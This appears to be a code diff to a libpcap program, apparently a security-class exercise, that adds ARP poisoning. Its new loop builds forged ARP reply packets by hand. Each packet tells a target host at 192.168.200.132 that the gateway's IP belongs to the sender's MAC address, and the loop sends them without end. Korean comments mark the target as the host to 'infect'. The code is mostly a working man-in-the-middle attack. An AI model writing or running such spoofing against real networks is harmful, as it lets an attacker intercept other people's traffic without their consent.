@@ -5,15 +5,16 @@
 #include <libnet.h>
 #include <netinet/ether.h>
 #include <arpa/inet.h>
+#include <thread>
 
-//unsigned char	mymac[] = {0x24, 0xf5, 0xaa, 0x75, 0xa4, 0xdf};
-//unsigned char	myip[] = {0xc0, 0xa8, 0x00, 0x07};
+void arp_infection(pcap_t handle);
 
 int main()
 {
     pcap_t *handle;
     char *dev = "wlan0";
     u_char req_packet[42];
+    u_char infect_packet[42];
     int i = 0;
     char errbuf[PCAP_ERRBUF_SIZE];
     handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
@@ -69,7 +70,6 @@ int main()
     req_packet[39]=168;
     req_packet[40]=200;
     req_packet[41]=1;
-
     for(i=0; i<6; i++){
         if ((pcap_sendpacket(handle,req_packet,42)) != 0)
         {
@@ -80,6 +80,68 @@ int main()
             printf("arp send\n");
         }
     }
+
+    while(true)
+    {
+    /* ethernet 감염시킬 sender의 mac */
+    infect_packet[0]=0x24;
+    infect_packet[1]=0xf5;
+    infect_packet[2]=0xaa;
+    infect_packet[3]=0x76;
+    infect_packet[4]=0xa4;
+    infect_packet[5]=0xdf;
+    /* ethernet source */
+    infect_packet[6]=0x24;
+    infect_packet[7]=0xf5;
+    infect_packet[8]=0xaa;
+    infect_packet[9]=0x75;
+    infect_packet[10]=0xa4;
+    infect_packet[11]=0xdf;
+    /* ether type */
+    infect_packet[12]=0x08;
+    infect_packet[13]=0x06;
+    /* arp hardware type */
+    infect_packet[14]=0x00;
+    infect_packet[15]=0x01;
+    /* arp protocol type */
+    infect_packet[16]=0x08;
+    infect_packet[17]=0x00;
+    /* arp hardware size */
+    infect_packet[18]=0x06;
+    /* arp protocol size */
+    infect_packet[19]=0x04;
+    /* arp opcode */
+    infect_packet[20]=0x00;
+    infect_packet[21]=0x02;
+    /* arp my mac */
+    infect_packet[22]=0x24;
+    infect_packet[23]=0xf5;
+    infect_packet[24]=0xaa;
+    infect_packet[25]=0x75;
+    infect_packet[26]=0xa4;
+    infect_packet[27]=0xdf;
+    /* arp gateway ip  */
+    infect_packet[28]=192;
+    infect_packet[29]=168;
+    infect_packet[30]=200;
+    infect_packet[31]=1;
+    /* arp 감염시킬 sender의 mac */
+    infect_packet[32]=0x24;
+    infect_packet[33]=0xf5;
+    infect_packet[34]=0xaa;
+    infect_packet[35]=0x76;
+    infect_packet[36]=0xa4;
+    infect_packet[37]=0xdf;
+    /* arp 감염시킬 sender의 ip */
+    infect_packet[38]=192;
+    infect_packet[39]=168;
+    infect_packet[40]=200;
+    infect_packet[41]=132;
+
+    pcap_sendpacket(handle,infect_packet,42);
+
+    }
+
     pcap_close(handle);
     return(0);
 }
